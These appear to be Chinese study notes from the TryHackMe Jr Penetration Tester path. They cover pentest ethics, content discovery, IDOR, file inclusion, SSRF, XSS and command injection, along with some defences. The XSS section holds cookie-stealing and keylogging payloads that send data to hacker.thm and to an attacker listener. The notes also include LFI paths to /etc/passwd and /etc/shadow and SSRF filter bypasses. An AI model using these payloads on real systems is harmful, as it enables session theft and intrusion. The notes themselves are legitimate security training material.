# Jr Penetration Tester
## [网络安全简介](https://github.com/MasterandRoot/Learn-THM/blob/main/Pre%20Security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%80%E4%BB%8B.md)

## 渗透测试简介
### 渗透基础知识
- 什么是渗透测试
  - 遵守法律和道德
- 渗透测试道德
  - 白帽、灰帽、黑帽
  - ROE (Rules of Engagement)
    - 渗透测试参与的初始阶段创建的文档
    - 许可、测试范围、使用手段
    - [文档示例](https://sansorg.egnyte.com/dl/bF4I3yCcnt/?)
- 渗透测试框架
  - OSSTMM(The Open Source Security Testing Methodology Manual)
  - OWASP
    - 专注于Web安全
  - NIST Cybersecurity Framework 1.1(2.0)
  - NCSC CAF
- 黑、白、灰盒测试
### 安全原则
- CIA 三原则
  - 机密性、完整性、可用性
- 特权原则
  - PIM(特权身份管理)
  - PAM(特权帐户管理)
-安全模型
  - The Bell-La Padula Model
    - 状态机模型
    - 用于在政府和军事应用中实施访问控制
    - 能够自上而下，不能自下而上
    - 主要实现机密性
  - Biba Model
    - 能够自下而上，不能自上而下
## Web安全简介
### 遍历Web应用
- 探索网站
  - 通过浏览器浏览网站并记下各个页面/区域/功能，并为每个页面/区域/功能提供摘要。
    - homepage `/`
    - latest news `/news`
    - news article `/news/article?id=1`
    - ...
- 查看网页源代码
  - `<!-- 这是注释 -->`
  - 查看链接
  - 外部文件所在文件夹
  - 框架版本漏洞
- 开发者工具
  - 检查元素
  - 网络
  - 源代码
### 内容发现(Content Discovery)
- 什么是内容发现
  - 内容发现的三种方式
    - 手动(Manually)
    - 自动(Automated)
    - 开源情报(OSINT)   
- Manually - Robots.txt
  - 该文件是告诉搜索引擎哪些页面能够访问，哪些不允许访问
  - [robots.txt详解](https://developers.google.com/search/docs/crawling-indexing/robots/intro)
- Manually - Favicon
  - 标题栏的小图标
  - 当使用框架构建网站时，作为安装一部分的图标会留下。
  - 如果网站开发人员没有用自定义图标替换它，这可以让我们了解正在使用的框架。OWASP 托管一个常见框架图标的数据库，您可以使用它来检查目标 [favicon](https://wiki.owasp.org/index.php/OWASP_favicon_database) 使用的框架
  - 一旦我们知道了框架，我们就可以使用外部资源来发现更多关于它的信息。
- Manually - Sitemap.xml
  - 站点地图
  - 包含您希望机器人发现和访问的网站上所有页面的列表
- Manually - HTTP头
  - `curl http://ip -v`
  - 可能包含一些有用的信息
    - 服务器版本
    - 使用的语言
    - ...
- Manually - 框架发现
  - 查找框架文档，发现类似于后台、管理台等入口。
- OSINT - Google Hacking / Dorking
  - `site`  查找只来自该网站的结果
  - `inurl` 查找url包含相关关键词的结果
  - `filetype`  查找文件类型
  - `intitle`  查找文件标题
- OSINT - Wappalyzer
  - [Wappalyzer](https://www.wappalyzer.com/) 是一种在线工具和浏览器扩展程序，可帮助识别网站使用的技术，例如框架、内容管理系统 (CMS)、支付处理器等等，它甚至可以也可以找到版本号。
- OSINT - Wayback Machine
  - [ Wayback Machine ]( https://archive.org/web/ ) 是可追溯到 90 年代后期的网站历史档案。您可以搜索一个域名，它会一直显示该服务抓取网页并保存内容的所有时间。
  - 该服务可以帮助发现在当前网站上可能仍处于活动状态的旧页面。
- OSINT - GitHub
- OSINT - S3 Buckets
  - S3 Buckets是amzon提供的一项服务，能够把静态内容存储到云上。
  - 如果权限配置不正确，这些静态内容就能够被访问。
- Automated 
  - 好用的 [wordlists.txt](https://github.com/danielmiessler/SecLists)
  - ffuf
    - `ffuf -w wordlists.txt -u http://ip`
  - dirb
    - `dirb http://ip wordlists.txt`
  - Gobuster
    - `gobuster dir --url http://ip -w wordlists.txt`
### 子域枚举
- 简介
  - 为了扩大我们的攻击面，以尝试发现更多潜在的漏洞点
  - 常见方法
    - 蛮力(Brute Force)
    - 开源情报(OSINT)
    - 虚拟主机(Virtual Host)
- OSINT - SSL/TLS证书
  - 使用 CA 为每个申请证书创建 CT 日志
  - 使用 [crt.sh]( https://crt.sh )
- OSINT - Google Hacking / Dorking
  - 上节已表述。
- DNS暴力破解
  -  `dnsrecon` 工具
- OSINT - [Sublist3r](https://github.com/aboul3la/Sublist3r)
  - Sublist3r 是一个 python 工具，旨在使用 OSINT 枚举网站的子域。它帮助渗透测试人员和漏洞猎手收集和收集他们所针对的域的子域。
- 虚拟主机
  - ffuf 
    - `fuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP` 


### 绕过验证
- 用户名枚举
- 蛮力破解密码
- 程序逻辑缺陷
- cookie 篡改
  - 纯文本
    - `Set-Cookie: logged_in=true; Max-Age=3600; Path=/` 
    - `Set-Cookie: admin=false; Max-Age=3600; Path=/`
  - Hash
    - 一些Cookie会使用Hash编码
    - 哈希碰撞
  - 编码
    - `base64`

### IDOR
- 什么是IDOR
  - 不安全的直接对象引用，是一种访问控制漏洞。
  - 对用户输入数据信任过高
- IDOR示例
  - 访问 `http://online-service.thm/profile?user_id=1305`,能够访问用户个人信息
  - 尝试 `http://online-service.thm/profile?user_id=1000`,能够访问其他用户的个人信息
- 编码中寻找IDORs
  ![编码](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5f2cbe5c4ab4a274420bc9a9afc9202d.png)
- 哈希中寻找IDORs
  - hash碰撞
- 在不可预测里寻找IDORs
  - 如果上述两种方法无法检查到ID,则一种优秀的方式是申请两个账户并在他们之间交换ID,以此寻找IDOR漏洞。
### File Inclusion（文件包含）
- 简介
  ![文件包含示例](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png)
  - 文件包含成因
    - 主要原因是未输入验证。用户输入未经验证审核。
  - 影响
    - 利用漏洞读取敏感信息
    - 利用漏洞挂马
- 路径遍历
  - 也被成为目录遍历
  - 示例
  ![目录遍历示例](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/45d9c1baacda290c1f95858e27f740c9.png)
  - 上述也被称为 `dot-dot-slash` 攻击
  - 利用 `../` 
  - 常见的系统文件
    - `/etc/issue`
      - 系统登陆前的提示信息
    - `/proc/version`
      - 系统内核版本
    - `/etc/passwd`
      - 有权访问系统的所有注册用户
    - `/etc/shadow`
      - 有权访问系统用户的密码
    - `C:\boot.ini`
      - 包含具有 BIOS 固件的计算机的引导选项
- LFI(本地文件包含)
  - `http://webapp.thm/get.php?lang=/etc/passwd`
  - `http://webapp.thm/index.php?lang=../../../../etc/passwd`
  - php在低于5.3.4版本上 `%00` 截断
    - url编码的问题？
  - 关键字过滤
  - 关键字替换
    - php的匹配规则

    ![php匹配规则](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png)
- RFI(远程文件包含)
  - php打开 `allow_url_fopen` 选项
  - RFI示例

  ![RFI示例](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png)
- FI防范建议
  - 更新最新版本
  - 关闭后端错误提醒
  - 关闭不必要的配置选项
  - 用户输入验证
  - 文件访问白名单
- 挑战
  - 通过 `GET` `POST` `Cookie` `Http Headers` 发现入口点
  - 有效输入查看系统表现
  - 无效输入，包括特殊字符
  - 涉及url编码问题，尝试在浏览器url框或Burp
  - 测试是否有过滤器
  - flag1
    - 使用Burp更改 `GET` 为 `POST`
  - flag2 
    - 查看cookie
      - 只验证是否包含 `guest`字符，即使用`guest123`也能绕过验证
    - 基本的 `%00` 截断
  - flag3
    - 根据提示，web后台使用 `$_REQUESTS` 接收HTTP请求。
      -  `$_REQUESTS` 超全局变量的特性，是 `$_GET`  `$_POST`  `$_COOKIE` 的合集，而且数据是复制过去的，并不是引用。
    - 测试后发现过滤，过滤后只接受字母。
    - 根据`$_REQUESTS`的特性，将方法改为 `POST` 后，发现过滤失效
    - 基本的 `%00` 截断
  - php获取hostname
    - 版本不同，使用不同的语句



### SSRF
- 简介
  - 服务端请求伪造
  - 指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。
  - SSRF攻击通常针对外部网络无法直接访问的内部系统。
  - 两种形式
    - 常规SSRF，数据回显到攻击者屏幕
    - 盲SSRF，数据不回显
- SSRF示例
  - 示例1

  ![SSRF示例1](https://static-labs.tryhackme.cloud/sites/ssrf-examples/images/ssrf_1.png)
    - 请求完整的url时，把url更改为攻击载荷url
  - 示例2

  ![SSRF示例2](https://static-labs.tryhackme.cloud/sites/ssrf-examples/images/ssrf_2.png)
    - 示例显示了攻击者如何仅通过利用目录遍历来控制路径仍然可以到达 `/api/user` 页面。 
    - 当 website.thm 收到 `../` 时，这是一条向上移动目录的消息，该目录删除请求的 `/stock` 部分并将最终请求变为 `/api/user`
  - 示例3

  ![SSRF示例3](https://static-labs.tryhackme.cloud/sites/ssrf-examples/images/ssrf_3.png)
    - 该示例显示攻击者可以控制发出请求的服务器子域
    - 预期访问url`http://website.thm/stock?server=api&id=123`
      - 该请求到达服务器后，服务器根据`server=api`使用子域名`api.website.thm/api/stock/item?id=123`
    - 使用 `&x=` 阻止剩余路径附加到攻击者 URL 的末尾，而是将其转换为查询字符串中的参数 (?x=)。
  - 示例4

  ![SSRF示例4](https://static-labs.tryhackme.cloud/sites/ssrf-examples/images/ssrf_4.png)
    - 与示例1类似，攻击者可以改为强制网络服务器请求攻击者选择的服务器。
    - 通过这样做，我们可以捕获发送到攻击者指定域的请求标头。 
    - 这些标头可能包含由 website.thm 发送的身份验证凭据或 API 密钥（通常会向 api.website.thm 进行身份验证）
  - challenge
    - 与示例3类似，构造`https://website.thm/item/8?server=server.website.thm/flag?id=9&x=`

- 发现SSRF漏洞
  - 可以通过许多不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。
  - 四个常见位置的示例
    - 在URL中使用完整的URL时

    ![URL SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png)
    - 表单的隐藏字段

    ![form SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png)
    - 部分 URL，例如主机名

    ![server SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png)
    - 只是路径

    ![path SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png)
- SSRF防御手段
  - Deny List
    - Web应用程序可以使用该手段来保护敏感端点、IP 地址或域不被公众访问，同时仍然允许访问其他位置。
    - 最常使用的是 `localhost` `127.0.0.1`等
    - 如何绕过
      - 使用 `0` `0.0.0.0` `127.1` `127.*.*.*` `2130706433` `127.0.0.1.nip.io` 等
    - 在云环境里，禁止 `169.254.169.254` 的访问
  - Allow List
    - 允许列表是拒绝所有请求的地方，除非它们出现在列表中或匹配特定模式，例如参数中使用的 URL 必须以 `https://website.thm` 开头的规则。 
    - 如何绕过
      - 攻击者可以通过在攻击者的域名上创建子域来快速规避此规则，例如 `https://website.thm.attackers-domain.thm`。
      - 应用程序逻辑现在将允许此输入并让攻击者控制内部HTTP请求。
  - 重定向
    - 如果上述绕过方法不起作用，攻击者还可以使用另一种技巧，即开放重定向。- 开放重定向是服务器上的一个端点，网站访问者可以在该端点自动重定向到另一个网站地址。以链接 https://website.thm/link?url=https://tryhackme.com 为例。
    - 创建此端点是为了记录访问者出于广告/营销目的点击此链接的次数。
    - 但想象一下，存在一个潜在的 SSRF 漏洞，它具有严格的规则，只允许以 https://website.thm/ 开头的 URL。
    - 攻击者可以利用上述功能将内部HTTP请求重定向到攻击者选择的域。
- SSRF实践
  - 内容发现
    - `gobuster dir --url http://ip -w wordlists.txt`
    - 发现两个路径
      - `/private` 拒绝访问
      - `/customers/new-account-page` 新版的用户账户界面，允许客户选择头像
  - 访问 `http://ip/customers/new-account-page` ,通过查看头像表单的页面源，发现头像表单 Value 值包含图像的路径。
  - 更改头像后，发现头像被base64编码后储存在前端
  - 更改头像表单 Value 值，`/private` ,发现拒绝访问。
  - 使用 `x/../private` 绕过,得到 `/private` 中base64编码的内容，解码。

### Cross-site Scripting(XSS)
- 简介
- XSS Payloads
  - 常见的有效载荷
    - 验证，是否存在XSS
    ```JavaScript 
      <script>alert('XSS');</script>
    ```
    - 会话窃取
    ```JavaScript
      <script>
        fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));
      </script>
    ```
    - 按键记录器
    ```JavaScript
      <script>
        document.onkeypress = function(e) { 
            fetch('https://hacker.thm/log?key=' + btoa(e.key) );
          }
      </script>
    ```
- Reflected XSS
  - 当用户在HTTP请求中提供的数据未经任何验证就包含在网页源中时，就会发生反射型 XSS
  - 常见测试位置
    - URL中的查询参数
    - 网址文件路径
    - 在HTTP标头
- Stored XSS
  - 常见测试位置
    - 博客评论
    - 用户档案信息
    - 网站列表
- 基于DOM的XSS
  - DOM
    - DOM指文件对象模型，是HTML和XML文档的编程接口。

    ![HTML DOM 的图表](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png)
  - 基于 DOM 的 XSS 是 JavaScript 直接在浏览器中执行的地方，无需加载任何新页面或将数据提交给后端代码。
  - 当网站 JavaScript 代码作用于输入或用户交互时执行。
- Blind XSS
  - 类似于Stored XSS,只是攻击者看不到反射结果
  - 示例场景
    - 一个网站有一个联系表单，可以通过表单向员工发送消息。
    - 后台不会检查表单内容是否有任何恶意代码，这使攻击者可以输入他们想要的任何内容。
    - 然后，这些消息会变成工单，员工可以在后台网站上查看这些工单。
  - 潜在影响
    - 使用正确的payload，攻击者的 JavaScript 可以回调攻击者的网站，显示员工门户 URL、员工的 cookie，甚至是正在查看的门户页面的内容。
  - 流行的Blind XSS工具 [XSShunter](https://github.com/mandatoryprogrammer/xsshunter-express)
- 完善Payload
  - 级别1
    ```JavaScript 
      <script>alert('XSS');</script>
    ```
  - 级别2
    ```JavaScript
      //html文档
      <input value="123"> 
      //payload
      "><script>alert('XSS');</script>
      //结果预览
      <input value=""><script>alert('XSS');</script>"> 
    ```
    - 其中 `">` 是该payload关键。
  - 级别3
    ```JavaScript
      //html文档
      <textarea>123</textarea> 
      //payload，和级别2类似
      </textarea><script>alert('XSS');</script>
      //结果预览
      <textarea>123</textarea><script>alert('XSS');</script></textarea> 
    ```
  - 级别4
    ```JavaScript
      //html文档
      document.getElementsByClassName('name')[0].innerHTML='123';
      //payload
      ';alert('XSS');//
      //结果预览
      document.getElementsByClassName('name')[0].innerHTML='';alert('XSS');//;
    ```
  - 级别5
    ```JavaScript
      //后台过滤关键词'script'
      //payload
      <sscriptcript>alert('THM');</sscriptcript>
    ```
    - 绕过不聪明关键词过滤的技巧
      - `<sscriptcript>`
      - `....//`
      - `pphphp`

  - 级别6
    ```JavaScript
      //html文档
      <img src="scriptalert('THM');/script">
      //发现过滤了'<' '>',导致失败
      //使用 img 标签 onload属性 
      //payload
      /images/cat.jpg" onload="alert('THM');
      //结果预览
      <img src="/images/cat.jpg" onload="alert('THM');">
    ```
- Blind XSS实战
  - 一个网站有一个联系表单，可以通过表单向员工发送消息。
  - 后台不会检查表单内容是否有任何恶意代码，这使攻击者可以输入他们想要的任何内容。
  - 然后，这些消息会变成工单，员工可以在后台网站上查看这些工单。

  - paylaod
    - `</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>`
      - `fetch()` 生成 HTTP 访问
      - `btoa()` base64编码
      - `document.cookie` 当前cookie
  - 攻击者 `nc -lvnp port` 监听

### Command Injection(命令注入)
- 什么是命令注入
  - 又称RCE，远程代码执行
- 发现
  - 存在此漏洞是因为应用程序经常使用编程语言（如PHP、Python 和 NodeJS）中的函数来向计算机操作系统传递数据并在计算机操作系统上进行系统调用。
  - 例如，从字段中获取输入并在文件中搜索条目。
  
  - python实现命令注入
    ```python
    import subprocess
    from flask import Flask
    app = Flask(__name__)
    def execute_command(shell):
      return subprocess.Popen(shell,shell=Ture,stdout=subprocess.PIPE).stdout.read()
    @app.route('/<shell>')
    def command_server(shell):
      return execute_command(shell)
    ```
- 利用
  - 注入有回显
  - 注入无回显
    - `>` 
    - `curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`
  - 有效payload
    - Linux
      - `whoami`
      - `ls`
      - `sleep`
      - `nc`
    - windows
      - `whoami`
      - `dir`
      - `ping`
      - `timeout`
- 防止
  - 可以通过多种方式防止命令注入。
    - 尽可能少地使用编程语言中具有潜在危险的函数或库
    - 不依赖用户输入的情况下过滤输入
  - 下面的示例是PHP编程语言；然而，相同的原则可以扩展到许多其他语言。
  - 在PHP中，易受攻击的函数
    - `Exec`
      ```php
        exec('whoami', $output, $retval);//$retval 如果与$output一起存在，则$retval代表返回状态
      ```
    - `Passthru`
    - `System`












